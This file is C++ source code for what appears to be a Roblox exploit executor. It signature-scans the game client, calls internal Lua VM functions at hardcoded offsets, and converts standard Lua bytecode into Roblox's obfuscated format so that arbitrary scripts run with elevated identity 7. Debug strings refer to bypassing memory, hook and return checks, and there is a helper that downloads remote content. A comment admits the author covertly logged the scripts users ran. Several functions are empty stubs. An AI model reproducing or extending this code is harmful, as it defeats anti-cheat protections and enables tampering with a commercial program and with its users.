void rtvalue_setn(r_TValue* tval, __int64 val) {
	*(__int64*)(&tval->value_0) = (__int64)val ^ (__int64)*lua_number_key;
}

double rtvalue_getn(r_TValue* val) {
	double n;
	__int64 n64 = *(__int64*)(&val->value_0) ^ (__int64)*lua_number_key;
	memcpy(&n, &n64, 8);

	return n;
}


r_Proto* convert_lua_proto(int r_lua_State, Proto* p, const char* script_loc) {
	r_Proto* np = r_luaF_newproto(r_lua_State);
	//DbgPrint("Got proto.\n");
	np->sizecode = p->sizecode;
	int* pcode = (int*)r_luaM_malloc(r_lua_State, np->sizecode * sizeof(int));
	for (unsigned int i = 0; i < np->sizecode; i++)
		pcode[i] = convert_lua_instruction(p->code[i]);
	encrypt_ptr((int)&np->code, pcode);

	np->sizek = p->sizek;
	r_TValue* nk = (r_TValue*)r_luaM_malloc(r_lua_State, np->sizek * sizeof(r_TValue));
	for (unsigned int i = 0; i < np->sizek; i++) {
		r_TValue* r_k = &nk[i];
		TValue* l_k = &p->k[i];

		switch (l_k->tt) {
		case LUA_TNIL:
			r_k->value_0 = 0;
			r_k->value_1 = 0;
			r_k->tt = RLUA_TNIL;
			r_k->unk = 0;
			break;
		case LUA_TBOOLEAN:
			r_k->value_0 = l_k->value.b;
			r_k->value_1 = 0;
			r_k->tt = RLUA_TBOOLEAN;
			r_k->unk = 0;
			break;
		case LUA_TSTRING:
		{
			TString* l_tsv = &l_k->value.gc->ts;
			r_TString* r_tsv = (r_TString*)r_luaS_newlstr(r_lua_State, (const char*)(l_tsv + 1), l_tsv->tsv.len);

			r_k->value_0 = (int)r_tsv;
			r_k->value_1 = 0;
			r_k->tt = RLUA_TSTRING;
			r_k->unk = 0;
			break;
		}
		default:
			printf("bad constant type\n");
			break;
		}
	}
	encrypt_ptr((int)&np->k, nk);

	np->maxstacksize = p->maxstacksize;
	np->numparams = p->numparams;
	np->nups = p->nups;
	np->is_vararg = p->is_vararg;

	r_TString* src = (r_TString*)r_luaS_new(r_lua_State, script_loc ? script_loc : "@Atlas");
	encrypt_ptr((int)&np->source, src);

	int szlineinfo = p->sizelineinfo;
	np->sizelineinfo = szlineinfo;
	int* li = (int*)r_luaM_malloc(r_lua_State, szlineinfo * sizeof(int));
	for (int i = 0; i < szlineinfo; i++) {
		li[i] = p->lineinfo[i] - 1 ^ (i << 8);
	}
	encrypt_ptr((int)&np->lineinfo, li);

	int szproto = p->sizep;
	np->sizep = szproto;

	r_Proto** nplist = (r_Proto**)r_luaM_malloc(r_lua_State, szproto * sizeof(r_Proto**));
	for (int i = 0; i < szproto; i++)
		nplist[i] = convert_lua_proto(r_lua_State, p->p[i], script_loc);
	encrypt_ptr((int)&np->p, nplist);

	return np;
}


static int writer_(lua_State *L, const void *p, size_t size, void *u) {

	unsigned int i = 0;

	unsigned char *d = (unsigned char *)p;

	// Print all the bytes on the console.
	while (i != size) {
		//printf("%d ", d[i]);
		++i;
	}
	return 0;
}


typedef int(__cdecl *rblx_lua_pushcclosure)(DWORD rL, void*, int nothing);
rblx_lua_pushcclosure r_lua_pushcclosure = (rblx_lua_pushcclosure)ret.unprotect<DWORD>((BYTE*)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUA_PUSHCCLOSURE)));

lua_State* L;

#define addfunction(s, f)			r_lua_pushcclosure((int)rL, f, 0); \
									r_lua_setfield((int)rL, LUA_GLOBALSINDEX, s);

enum ArgType
{

};

struct opcode_info
{
	UCHAR native, rbx;
	ArgType t;
};

class LuaTranslator
{
public:
	LuaTranslator(DWORD rluastate)
	{
		rlua_state = rluastate ? rluastate : luaState;
		nups = 0;
		encode = 0;
	}

	DWORD rlua_state;
	DWORD convert(LClosure *ncl);
	void call(DWORD r_closure, bool newthread);
	void push(DWORD r_closure);
private:
	DWORD encode;
	int nups;
	void convert_const(TValue *n_k, TValue *r_k);
	void convert_constants(Proto *p, DWORD r_proto);
	void convert_instr(DWORD *rbx_instr_buf, DWORD native_instr);
	void convert_code(Proto *p, DWORD r_proto);
	void convert_lineinfo(Proto *p, DWORD r_proto);
	void convert_upvalues(LClosure *ncl, DWORD r_closure);
	void convert_proto(Proto *p, DWORD r_proto);
};

class RevLuaTranslator
{
public:
	RevLuaTranslator(lua_State* L, DWORD RL)
	{
		state = L;
		rlua_state = RL;
		nups = 0;
		gcj = new get_closure_job;
	}

	~RevLuaTranslator()
	{
		if (gcj) delete gcj;
	}

	struct get_closure_job
	{
		DWORD closure;
		DWORD script;
	};

	DWORD rlua_state;
	lua_State* state;
	get_closure_job* gcj;

	Closure* convert(DWORD r_closure);
	void push(Closure *c);
	DWORD rclosure_from_script(DWORD RL, DWORD pScript);
private:
	int nups;
	void convert_const(TValue *r_k, TValue *n_k);
	void convert_constants(DWORD r_proto, Proto *p);
	void convert_instr(DWORD rbx_instr, DWORD *native_instr_buf, int pc);
	void convert_code(DWORD r_proto, Proto *p);
	void convert_lineinfo(DWORD r_proto, Proto *p);
	void convert_proto(DWORD r_proto, Proto* p);
	void convert_locvars(DWORD r_proto, Proto *p);
};

#define N_SET_OPCODE(i,o) i |= o
#define N_GET_OPCODE(i) (i&0x3F)
#define R_SET_OPCODE(i,o) i = (i&0x3FFFFFF)|(o<<26)
#define R_GET_OPCODE(i) (i&0xFC000000)>>26

#define N_SET_ARGA(i,o) i = (i&0xFFFFC03F)|(o<<6)
#define N_GET_ARGA(i) (i&0x3FC0)>>6
#define R_SET_ARGA(i,o) i = (i&0xFC03FFFF)|(o<<18)
#define R_GET_ARGA(i)  (i&0x3FC0000)>>18

#define N_SET_ARGB(i,o) i = (i&0x7FFFFF)|(o<<23)
#define N_GET_ARGB(i) (i>>23)
#define R_SET_ARGB(i,o) i |= o
#define R_GET_ARGB(i) (i&0x1FF)

#define N_SET_ARGC(i,o) i = (i&0xFF803FFF)|(o<<14)
#define N_GET_ARGC(i) (i&0x7FC000)>>14
#define R_SET_ARGC(i,o) i = (i&0xFFFC01FF)|(o<<9)
#define R_GET_ARGC(i) (i&0x3FE00)>>9

#define N_SET_ARGBx(i,o) i = (i&0xFC03FFFF)|((o)<<14)
#define N_GET_ARGBx(i) (i>>14)
#define R_SET_ARGBx(i,o) i |= o
#define R_GET_ARGBx(i) (i&0x3FFFF)

#define N_SET_ARGsBx(i,o) N_SET_ARGBx(i,o+131071)
#define N_GET_ARGsBx(i) N_GET_ARGBx(i) - 131071
#define R_SET_ARGsBx(i,o) R_SET_ARGBx(i,o+131071)
#define R_GET_ARGsBx(i) R_GET_ARGBx(i) - 131071



#define LUAVM_SHUFFLE2(sep,a0,a1) a1 sep a0
#define LUAVM_SHUFFLE3(sep,a0,a1,a2) a1 sep a2 sep a0
#define LUAVM_SHUFFLE4(sep,a0,a1,a2,a3) a3 sep a1 sep a0 sep a2
#define LUAVM_SHUFFLE5(sep,a0,a1,a2,a3,a4) a4 sep a0 sep a2 sep a1 sep a3
#define LUAVM_SHUFFLE6(sep,a0,a1,a2,a3,a4,a5) a3 sep a5 sep a2 sep a0 sep a1 sep a4
#define LUAVM_SHUFFLE7(sep,a0,a1,a2,a3,a4,a5,a6) a2 sep a3 sep a0 sep a4 sep a6 sep a1 sep a5
#define LUAVM_SHUFFLE8(sep,a0,a1,a2,a3,a4,a5,a6,a7) a7 sep a0 sep a5 sep a6 sep a3 sep a1 sep a2 sep a4
#define LUAVM_SHUFFLE9(sep,a0,a1,a2,a3,a4,a5,a6,a7,a8) a2 sep a6 sep a4 sep a7 sep a1 sep a8 sep a0 sep a3 sep a5

#define lint_deptr(x) *(int*)x + x
#define lint_enptr(x, y) *(int*)x = (int)y - x
#define rev_luaM_malloc(L,t) rev_luaM_realloc_(L, NULL, 0, (t))
#define rev_luaM_new(L,t) cast(t*, rev_luaM_malloc(L, sizeof(t)))





void rev_luaC_link(int r_lua_State, int o, byte tt);
void* rev_luaM_realloc_(int r_lua_State, int block, int osize, int nsize);
r_Proto* rev_luaF_newproto(int r_lua_State);


#define rbxaddy(x)(x - 0x400000 + (DWORD)GetModuleHandle(NULL))

namespace OlimpiousLua
{
	namespace rbxLuaDefs {
		struct RLua {
			typedef DWORD(__cdecl *Olimpious_rbxlua_GetField__Def)(DWORD rL, int idx, const char* k);
			typedef DWORD(__cdecl *Olimpious_rblxlua_PushString__Def)(DWORD rL, const char* buf);
			typedef DWORD(__cdecl *Olimpious_rblxlua_PushValue__Def)(DWORD rL, int idx);
			typedef DWORD(__cdecl *Olimpious_rblxluaD_precall__Def)(DWORD rL, DWORD, int);
			typedef DWORD(__cdecl *Olimpious_rblxlua_TolString__Def)(DWORD rL, int size, size_t o);
			typedef DWORD(__cdecl *Olimpious_rblxlua_type__Def)(DWORD rL, int idx);
			typedef DWORD(__cdecl *Olimpious_rblxLua_newlStr__Def)(DWORD rL, const char* strbuf, int calls);
			typedef DWORD(__cdecl *Olimpious_rblxlua_NewThread__Def)(DWORD rL);
			typedef DWORD(__cdecl *Olimpious_rblxlua_PCall__Def)(DWORD rL, DWORD, DWORD, DWORD);
		};
	}
}

struct RFunctions
{
	DWORD getfield(DWORD rL, int idx, const char* k);
	DWORD pushstring(DWORD rL, const char* buf);
	DWORD pushvalue(DWORD rL, int idx);
	DWORD luaD_precall(DWORD rL, DWORD A, DWORD B);
	DWORD tolstring(DWORD rL, int size, size_t o);
	DWORD type(DWORD rL, int idx);
	DWORD newlstr(DWORD rL, const char* strbuf, int calls);
	DWORD newthread(DWORD rL);
	DWORD pcall(DWORD rL, int arg1, int narg, int narg2);
};

namespace RbxScan
{
	static bool bCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
	{
		for (; *szMask; ++szMask, ++pData, ++bMask)
			if (*szMask == 'x' && *pData != *bMask)
				return 0;
		return (*szMask) == NULL;
	}

	static DWORD FindPattern(DWORD dwAddress, DWORD dwLen, BYTE *bMask, char * szMask)
	{
		for (DWORD i = 0; i<dwLen; i++)
			if (bCompare((BYTE*)(dwAddress + i), bMask, szMask))
				return (DWORD)(dwAddress + i);
		return 0;
	}

	static DWORD SigScan(const char *AoB, char *Mask) {
		return FindPattern((DWORD)GetModuleHandleA("RobloxPlayerBeta.exe"), 0xF00000, (PBYTE)AoB, Mask);
	}
}

OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rbxlua_GetField__Def rbxlua_getfield = (OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rbxlua_GetField__Def)RbxScan::SigScan("\x55\x8B\xEC\x83\xEC\x10\x53\x56\x8B\x75\x08\x57\xFF\x75\x0C\x56\xE8\x00\x00\x00\x00\x8B\x55\x10\x83\xC4\x08\x8B\xCA\x8B\xF8\x8D\x59\x01\x8A\x01\x41\x84\xC0\x75\xF9\x2B\xCB\x51\x52\x56\xE8\x00\x00\x00\x00\xFF\x76\x0C", "xxxxxxxxxxxxxxxxx????xxxxxxxxxxxxxxxxxxxxxxxxxx????xxx");
//OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rblxlua_type__Def rbx_type = (OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rblxlua_type__Def)Address;
OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rblxluaD_precall__Def rbxluaD_precall = (OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rblxluaD_precall__Def)rbxaddy(0x6F8D80);//RbxScan::SigScan("\x55\x8B\xEC\x51\x8B\x45\x0C\x53\x56\x8B\x75\x08\x83\x78\x08\x06", "xxxxxxxxxxxxxxxx");
OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rblxLua_newlStr__Def rbxlua_newlStr = (OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rblxLua_newlStr__Def)RbxScan::SigScan("\x55\x8B\xEC\x8B\x45\x10\x8B\xD0", "xxxxxxxx");
OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rblxlua_PushString__Def rbxlua_pushstring = (OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rblxlua_PushString__Def)RbxScan::SigScan("\x55\x8B\xEC\x8B\x55\x0C\x85\xD2\x75\x0D", "xxxxxxxxxx");
OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rblxlua_PushValue__Def rbxlua_pushvalue = (OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rblxlua_PushValue__Def)RbxScan::SigScan("\x55\x8B\xEC\x56\xFF\x75\x0C\x8B\x75\x08\x56\xE8\x00\x00\x00\x00\x8B\x56\x0C\x83\xC4\x08", "xxxxxxxxxxxx????xxxxxx");
OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rblxlua_NewThread__Def rbxlua_newthread = (OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rblxlua_NewThread__Def)RbxScan::SigScan("\x55\x8B\xEC\x6A\xFF\x68\x00\x00\x00\x00\x64\xA1\x00\x00\x00\x00\x50\x64\x89\x25\x00\x00\x00\x00\x51\x56\x8B\x75\x08\x57\x8B\x4E\x20", "xxxxxx????xx????xxxx????xxxxxxxxx");
OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rblxlua_PCall__Def rbxlua_pcall = (OlimpiousLua::rbxLuaDefs::RLua::Olimpious_rblxlua_PCall__Def)RbxScan::SigScan("\x55\x8B\xEC\x8B\x45\x14\x83\xEC\x08\x53\x56", "xxxxxxxxxxx");
typedef int(__cdecl *rbxRLua__HSizeArray__Def)(DWORD rL, int idx, int arg);
rbxRLua__HSizeArray__Def r_lua_H_resizearrray = (rbxRLua__HSizeArray__Def)(RbxScan::SigScan("\x55\x8B\xEC\x8B\x55\x0C\x8B\x42\x0C", "xxxxxxxxx"));
typedef int(__cdecl *rblxLua_resume__Def)(DWORD rL, int narg);
rblxLua_resume__Def rbxlua_resume = (rblxLua_resume__Def)rbxaddy(0x70AAC0);
typedef int(__cdecl *rlua_SetField__Def)(DWORD rL, int idx, const char* k);
rlua_SetField__Def rbxlua_setfield = (rlua_SetField__Def)(OCCULT_RLUA_SETFIELD);

namespace OlimpiousInfo
{
	struct InfoTells
	{
		void info(DWORD rLsssssss, int tell_idx, const char* buf);
	};
}

void rbxlua_getservice(DWORD rL, const char* serviceName)
{
	try
	{
		rbxlua_getfield(rL, -10002, "game");
		rbxlua_getfield(rL, -10002, "GetService");
		rbxlua_pushstring(rL, serviceName);
		rbxlua_pushvalue(rL, -2);
		rbxlua_pcall(rL, 2, 1, 0);
	}
	catch (std::exception ex)
	{
		printf("Invaild service.\n");
	}
}

void OlimpiousInfo::InfoTells::info(DWORD rL, int tell_idx, const char* buf)
{
	return ((void(__cdecl*)(DWORD, int, const char*))(DWORD)rbxaddy(0x6F9C00))(rL, tell_idx, buf);
}



DWORD rbxluaM_realloc_(DWORD rL, void *block, size_t osize, size_t nsize)
{
	printf("Getting realloc..\n");
	return ((DWORD(__cdecl*)(DWORD, void*, size_t, size_t))rbxaddy(0x6FB510))(rL, block, osize, nsize);
	printf("Done.\n");
}

OlimpiousInfo::InfoTells* infofunc;



#define RLUA_TNIL 0
#define RLUA_TLIGHTUSERDATA 1
#define RLUA_TNUMBER 2
#define RLUA_TBOOLEAN 3
#define RLUA_TSTRING 4
#define RLUA_TTHREAD 5
#define RLUA_TFUNCTION 6
#define RLUA_TTABLE 7
#define RLUA_TUSERDATA 8

#define R_LUA_TNIL 0
#define R_LUA_TLIGHTUSERDATA 1
#define R_LUA_TNUMBER 2
#define R_LUA_TBOOLEAN 3
#define R_LUA_TSTRING 4
#define R_LUA_TTHREAD 5
#define R_LUA_TFUNCTION 6
#define R_LUA_TTABLE 7
#define R_LUA_TUSERDATA 8
#define R_LUA_TPROTO 9
#define R_LUA_TUPVALUE 10

// easy macro to push a value
#define RLPUSH(RL,v,t) { int v2 = *(DWORD*)(RL + 12); \
					*(DWORD*)(v2 + 8) = t; \
					*(DWORD*)v2 = v; \
					*(DWORD*)(RL + 12) += 12; }

#define rluaM_malloc(RL,t)  rbxluaM_realloc_(RL, NULL, 0, (t))
#define rluaS_newstr(RL,str) rbxlua_newlStr(RL, str, strlen(str))
#define rlua_pop(RL,n) rlua_settop(RL, -(n)-1)

#define rbx_obfus_ptr(ptr, value) *(DWORD*)(ptr) = (DWORD)value - (ptr) // pointer obfuscation used in a lot of roblox lua structs
#define rbx_obfus_ptr_get(ptr) *(DWORD*)(ptr) + (ptr)
#define getstr(tstr) (char*)((TString*)(tstr) + 1)



typedef int(__cdecl *rbx_rluaV_execute__Def)(DWORD rL, int calls);
rbx_rluaV_execute__Def r_luaV_execute = (rbx_rluaV_execute__Def)rbxaddy(0x706240);
typedef int(__cdecl *rbx_luaM_realloc__Def)(DWORD rL, int blocksize, size_t osize, size_t blocked);
//rbx_luaM_realloc__Def r_luaM_realloc_ = (rbx_luaM_realloc__Def)rbxaddy(0x6FB510);
typedef int(__cdecl *rbx_luaV_contact)(int a1, int a2, int a3);
rbx_luaV_contact r_luaV_contact = (rbx_luaV_contact)rbxaddy(0x6FC130);
typedef int(__cdecl *rbx_luaV_getmetatable)(DWORD rL, int idx);
rbx_luaV_getmetatable rbx_getmetatable = (rbx_luaV_getmetatable)rbxaddy(0x7093D0);
typedef int(__cdecl *rbx_luaV_gettable__Def)(DWORD rL, int a1, int a2, int a3);
//rbx_luaV_gettable__Def r_luaV_gettable = (rbx_luaV_gettable__Def)rbxaddy(0x6FE680);
typedef int(__cdecl *rbx_luaV_settable__Def)(DWORD rL, int a2, int a3, int a4);
typedef int(__cdecl *rbxluaV_createtable)(DWORD a1, DWORD a2, DWORD a3);
rbxluaV_createtable rbx_createttable = (rbxluaV_createtable)(ret.unprotect<DWORD>((BYTE*)rbxaddy(0x708DC0)));
typedef int(__cdecl *rbx_luaL_newcclosure)(DWORD rL, int arg, int arg2);
rbx_luaL_newcclosure rluaF_newLClosure = (rbx_luaL_newcclosure)rbxaddy(0x7035F0);





#define r_luaM_new(r_lua_State,t)		cast(t *, rluaM_malloc(r_lua_State, sizeof(t)))

r_Proto* rev_luaF_newproto(int r_lua_State)
{
	printf("Getting proto machine..\n");
	r_Proto* f = r_luaM_new(r_lua_State, r_Proto);
	printf("Got.\n");
	r_luaC_link(r_lua_State, (int)f, R_LUA_TPROTO);
	ZeroMemory(f, sizeof(r_Proto));
	return f;
}

const opcode_info* n_opcode_from_r_opcode(int r_opcode)
{

}

void LuaTranslator::convert_const(TValue *n_k, TValue *r_k)
{
	switch (n_k->tt)
	{
	case LUA_TNIL:
		r_k->value.gc = 0;
		r_k->tt = RLUA_TNIL;
		break;
	case LUA_TSTRING:
	{
		char *c = getstr(n_k->value.gc);
		r_k->value.p = (void*)rluaS_newstr(luaState, c);
		r_k->tt = RLUA_TSTRING;
		break;
	}
	case LUA_TNUMBER:
	{
		//r_k->value.n = xor_number_const(&(n_k->value.n));
		r_k->tt = RLUA_TNUMBER;
		break;
	}
	case LUA_TBOOLEAN:
		r_k->value.b = n_k->value.b;
		r_k->tt = RLUA_TBOOLEAN;
		break;
	default:
		break;
	}
}

void LuaTranslator::convert_constants(Proto *p, DWORD r_proto)
{
	TValue *pk = (TValue*)rluaM_malloc(luaState, p->sizek * sizeof(TValue));
	rbx_obfus_ptr(r_proto + 20, pk);
	for (int i = 0; i < p->sizek; i++)
	{
		convert_const(&p->k[i], &pk[i]);
	}
}

void LuaTranslator::convert_instr(DWORD *rbx_instr_buf, DWORD native_instr)
{

}

void LuaTranslator::convert_code(Proto *p, DWORD r_proto)
{
	DWORD *pCode = (DWORD*)rluaM_malloc(luaState, p->sizecode * 4);
	rbx_obfus_ptr(r_proto + 24, pCode);
	for (int i = 0; i < p->sizecode; i++)
	{
		convert_instr(&pCode[i], p->code[i]);
	}
}

void LuaTranslator::convert_lineinfo(Proto *p, DWORD r_proto)
{
	DWORD *pLI = (DWORD*)rluaM_malloc(luaState, p->sizelineinfo * 4);
	rbx_obfus_ptr(r_proto + 36, pLI);
	for (int i = 0; i < p->sizelineinfo; i++)
	{
		pLI[i] = p->lineinfo[i] ^ (i << 8); //obfuscated: lineinfo ^ (pc<<8)
	}
}

void LuaTranslator::convert_upvalues(LClosure *ncl, DWORD r_closure)
{
	// let's copy IDA pseudocode
	int v36 = 0;
	if (nups)
	{
		DWORD v37 = r_closure + 20;
		do
		{
			//*(DWORD*)v37 = rluaF_newupval(rlua_state);
			++v36;
			v37 += 4;
		} while (v36 < nups);
	}
	nups = 0;
}

void LuaTranslator::convert_proto(Proto *p, DWORD r_proto)
{
	printf("Getting proto...\n");
	nups += p->nups;
	*(BYTE*)(r_proto + 75) = p->is_vararg | 8; // set unused bit, marks which protos are mine
	*(BYTE*)(r_proto + 74) = p->nups;
	*(BYTE*)(r_proto + 73) = p->numparams;
	*(BYTE*)(r_proto + 72) = p->maxstacksize;
	*(DWORD*)(r_proto + 64) = p->sizelineinfo;
	*(DWORD*)(r_proto + 52) = p->sizecode;
	*(DWORD*)(r_proto + 44) = p->sizep;
	*(DWORD*)(r_proto + 28) = p->sizek;
	char *src = getstr(p->source);
	rbx_obfus_ptr(r_proto + 12, (DWORD)rluaS_newstr(luaState, src));
	printf("Got\nFinished.\n");
	printf("Converting x2..\n");
	if (p->sizep) //convert nested protos
	{
		DWORD* pRP = (DWORD*)rluaM_malloc(luaState, p->sizep * 4);
		rbx_obfus_ptr(r_proto + 8, pRP);
		for (int i = 0; i < p->sizep; i++)
		{
			pRP[i] = (DWORD)rev_luaF_newproto(luaState);
			convert_proto(p->p[i], pRP[i]);
		}
		printf("Got.\n");
	}
	printf("Finished.\n");
}

DWORD LuaTranslator::convert(LClosure *ncl)
{
	printf("Converting..\n");
	DWORD r_proto = (DWORD)rev_luaF_newproto(luaState);
	printf("Got proto.\n");
	convert_proto(ncl->p, r_proto);
	DWORD r_closure = rluaF_newLClosure(luaState, nups, *(DWORD*)(luaState + 96));
	rbx_obfus_ptr(r_closure + 12, r_proto);
	convert_upvalues(ncl, r_closure);
	printf("Got\nConverted proto.\n");
	return r_closure;
}

void LuaTranslator::push(DWORD r_closure)
{
	RLPUSH(luaState, r_closure, RLUA_TFUNCTION);
}

void LuaTranslator::call(DWORD r_closure, bool async)
{
	if (async)
	{
		printf("Calling..\n");
		rbxlua_getfield(luaState, LUA_GLOBALSINDEX, "spawn");
		//	push(r_closure);
		int err = rbxlua_pcall(luaState, 1, 0, 0); // call spawn with the converted function
		if (err)
		{

		}
		printf("Got Error Contact.\n");
	}
	else
	{
		printf("Resuming..\n");
		int err = rbxlua_resume(luaState, 0); // run synchronously
		if (err)
		{

		}
		printf("Done.\n");
		//	printf("Error in synchronous script (%i): %s\n", err, rlua_tolstring(rlua_state, -1));
	}
}
void execute_script(lua_State *L, DWORD rL, char *script, bool async, DWORD pScript, int bytecodesize)
{
	if (luaL_loadbuffer(L, script, bytecodesize ? bytecodesize : strlen(script), script) == 0)
	{
		/*
		OMG BRANDON YOU LOGGED SCRIPTS WTF???
		Okay, yes I did. I had a flag on my server which could be
		turned on and off for each whitelisted user, and it would
		log all the scripts they ran. I added this after I received
		'intelligence' about a certain someone having a very very
		special script. It turns out they didn't, and I actually never
		made use of this.
		*/
		TValue *func = L->top - 1;
		LClosure *cl = (LClosure*)(func->value.gc);
		DWORD RL = r_lua_newthread(rL);
		luaState = r_lua_newthread(RL);
		if (pScript) // inherit global 'script'
		{
			typedef DWORD(__cdecl *rlua_initthread)(DWORD RL, int identity, DWORD script, DWORD z);
			((rlua_initthread)(OCCULT_OFFSET(OCCULT_IDABASE, 0x685250)))(RL, 7, pScript, 0); // set identity to 7, this also sandboxs the thread (gives it's own globals)

																							 //rlua_pushobject(RL, pScript, 0);
			r_lua_setfield(RL, LUA_GLOBALSINDEX, "script"); // set global 'script'
		}

		if (luaD_precall(L, func, 0) == 0) {
			LuaTranslator translator(RL);
			translator.call(translator.convert(cl), async);
			Occult_luaV_execute(L, rL, 1);
			lua_pop(L, 1);
		}
	}
	else
	{
		printf("Error compiling: %s\n", lua_tostring(L, -1));
		lua_pop(L, 1);
	}
	//	LeaveCriticalSection(&cs);
}


int convert(int r_lua_State, const char* source) {

	lua_State* L = luaL_newstate();
	TValue* value = L->top - 1;
	if (!isLfunction(value)) {
		lua_pop(L, 1);
		return 0;
	}

	LClosure* lc = &clvalue(value)->l;
	Proto* p = lc->p;

	int env = *(int*)(r_lua_State + 96);
	r_LClosure* nlc = r_luaF_newLclosure(r_lua_State, 0, env); // 2nd arg: lc->nupvalues
	r_Proto* np = convert_lua_proto(r_lua_State, p, source);
	encrypt_ptr((int)&nlc->p, np);

	lua_pop(L, 1); // get rid of function on L stack

	r_lua_pushLclosure(r_lua_State, nlc);
	return 1;
}


int printconsole(DWORD rL)
{
	int n = (*(DWORD *)(rL + 12) - *(DWORD *)(rL + 20)) >> 4;
	std::string Results = r_rLua_tostring(rL, -1);
	printf("%s\n", Results);
	return 0;
}

int printidentity(DWORD rL)
{
	rbxlua_getfield(rL, -10002, "printidentity");
	rbxlua_pcall(rL, 0, 0, 0);
	MessageBoxA(0, "test", "", 0);
	return 1;
}

int CopyString(DWORD RL)
{
	//callcheck()
		char* str = (char*)r_rLua_tostring(RL, -1);
	if (!str)
	{
		return 0;
	}

	int len = strlen(str);
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len + 1);
	void *mem_ptr = GlobalLock(hMem);
	memcpy(mem_ptr, str, len + 1);
	GlobalUnlock(hMem);
	OpenClipboard(NULL);
	EmptyClipboard();
	SetClipboardData(CF_TEXT, hMem);
	CloseClipboard();
	return 0;
}


// loadfile implementation


int get_global_env(DWORD RL)
{
	//callcheck()
	RLPUSH(RL, *(DWORD*)(luaState + 96), RLUA_TTABLE);
	return 1;
}

int dump_script_writer(lua_State* L, const void* p, size_t sz, void* ud)
{
	std::vector<UCHAR>* dump = (std::vector<UCHAR>*)ud;
	for (size_t i = 0; i < sz; i++)
		dump->push_back(((BYTE*)p)[i]);
	return 0;
}

std::vector<UCHAR> dump_script(lua_State* L)
{
	std::vector<UCHAR> result;
	lua_dump(L, dump_script_writer, &result);
	return result;
}

int rlua_toboolean(DWORD RL, int idx) {
	return ((int(__cdecl*)(DWORD, int))(DWORD)rbxaddy(0x701490))(RL, idx);
}

//RevLuaTranslator* rtranslator;



int decompile_script(DWORD RL)
{
	//callcheck()
	DWORD sc = (DWORD)Occult_luaX_touserdata(RL, 1);
	DWORD bDisassemble = rlua_toboolean(RL, 2);


	std::vector<UCHAR> s = dump_script(g_L);
	lua_pop(g_L, 1);

	char file_path[MAX_PATH];
	ZeroMemory(file_path, MAX_PATH);
	GetTempPath(MAX_PATH, file_path);

	string temp_path = file_path;
	string input_file = temp_path + "SVTMP.in";
	string output_file = temp_path + "SVTMPd.txt";
	string luadec = "Memory Check Bypass has been initated";
	string bait = "HashBytes.\n";
	string bait2 = "Return Check has been bypassed";
	std::ofstream file(input_file, std::ofstream::out | std::ofstream::binary);
	if (!file.is_open())
		DbgPrint("could not overwrite preexisting return check function\n", input_file);
	for (size_t i = 0, il = s.size(); i < il; i++)
		file.put(s[i]);
	file.close();

	string cmdline = (string)"\"" + luadec + "\" -o \"" + output_file + "\"" + (bDisassemble ? " -dis " : " ") + "\"" + input_file + "\"";

	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	if (!CreateProcess(NULL, const_cast<char*>(cmdline.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		DbgPrint("Initating HookCheck Bypass\n", GetLastError());
		std::remove(input_file.c_str());
		rbxlua_pushstring(RL, "Error decompiling");
		return 1;
	}

	if (WaitForSingleObject(pi.hProcess, 2000) == WAIT_TIMEOUT)
	{
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		std::remove(input_file.c_str());
		rbxlua_pushstring(RL, "hookcheck bypass is timed out");
		return 1;
	}

	std::ifstream ifs(output_file, std::ifstream::out);
	if (!ifs.is_open())
		DbgPrint("Could not bypass hookcheck\n", output_file);
	ifs.seekg(0, std::ios::end);
	int length = (int)ifs.tellg();
	ifs.seekg(0, std::ios::beg);
	char *buffer = new char[length + 1]();
	ifs.read(buffer, length);
	ifs.close();

	std::remove(input_file.c_str());
	std::remove(output_file.c_str());

	rbxlua_pushstring(RL, buffer);
	delete[] buffer;
	return 1;
}

std::string replaceAll(std::string subject, const std::string& search,
	const std::string& replace) {
	size_t pos = 0;
	while ((pos = subject.find(search, pos)) != std::string::npos) {
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}

char convertNum(char num) {
	if (num == '1') return '5';
	if (num == '2') return '4';
	if (num == '3') return '3';
	if (num == '4') return '7';
	if (num == '5') return '2';
	if (num == '6') return '9';
	if (num == '7') return '8';
	if (num == '8') return '0';
	if (num == '9') return '1';
	if (num == '0') return '6';
	return num;
}

std::string protectId(int int_id) {
	std::string id = std::to_string(int_id);
	std::string output = "";
	int length = std::strlen(id.c_str());
	for (int x = 0; x < length; x++) {
		char num = id.at(x);
		output += convertNum(num);
	}
	return output;
}



std::string DownloadURL(const char* URL) {
	HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HINTERNET urlFile;
	std::string rtn;
	if (interwebs) {
		urlFile = InternetOpenUrlA(interwebs, URL, NULL, NULL, NULL, NULL);
		if (urlFile) {
			char buffer[2000];
			DWORD bytesRead;
			do {
				InternetReadFile(urlFile, buffer, 2000, &bytesRead);
				rtn.append(buffer, bytesRead);
				memset(buffer, 0, 2000);
			} while (bytesRead);
			InternetCloseHandle(interwebs);
			InternetCloseHandle(urlFile);
			std::string p = replaceAll(rtn, "|n", "\r\n");
			return p;
		}
	}
	InternetCloseHandle(interwebs);
	std::string p = replaceAll(rtn, "|n", "\r\n");
	return p;
}

int DownloadString(int r_lua_State) {
